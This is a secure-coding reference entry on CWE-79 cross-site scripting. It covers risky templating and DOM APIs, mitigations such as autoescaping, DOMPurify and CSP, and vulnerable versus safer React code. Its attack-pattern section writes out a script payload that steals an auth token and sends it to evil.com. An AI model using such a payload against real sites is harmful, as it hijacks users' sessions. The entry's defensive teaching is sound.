# CWE-79: Cross-Site Scripting (XSS)

## Plain-English explanation
User-controlled text ends up rendered as live HTML or JavaScript in another user's browser. The attacker writes a `<script>…</script>` payload that runs in the victim's session — reading cookies, hitting authenticated endpoints, defacing the page.

## Typical attack pattern
A comment form on a blog stores comments and renders them as-is on the post page. An attacker posts a comment containing `<script>fetch('/api/me/token').then(r => r.text()).then(t => fetch('https://evil.com/' + t))</script>`. Every reader of that page silently donates their auth token.

## Reachability hints
- Templating engines used with autoescape **off**: `Handlebars.SafeString`, `{{{…}}}` in Mustache/Handlebars, `|safe` in Jinja2, `dangerouslySetInnerHTML` in React, `[innerHTML]` in Angular without sanitization.
- Direct DOM injection: `element.innerHTML = …`, `document.write(…)`.
- URL params reflected into the page (`location.search`).
- Markdown renderers that don't strip raw HTML (`marked`, `markdown-it`) without the `html: false` option.

## Common workarounds when a bump is blocked
- Force autoescape on every template. Treat `SafeString` / `|safe` / `dangerouslySetInnerHTML` as banned, allow only via reviewed exemptions.
- Use DOM APIs that don't parse HTML: `textContent`, `setAttribute` (carefully) instead of `innerHTML`.
- Sanitize with a maintained allowlist library (`DOMPurify`, `bleach`) at the boundary.
- Add a strict CSP: `default-src 'self'; script-src 'self' 'nonce-…'` — even if XSS lands, scripts without the nonce don't execute.

## Concrete code example

```jsx
// Vulnerable
<div dangerouslySetInnerHTML={{ __html: comment.body }} />

// Safer (autoescaped, no HTML)
<div>{comment.body}</div>

// Safer when you need formatting
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />
```
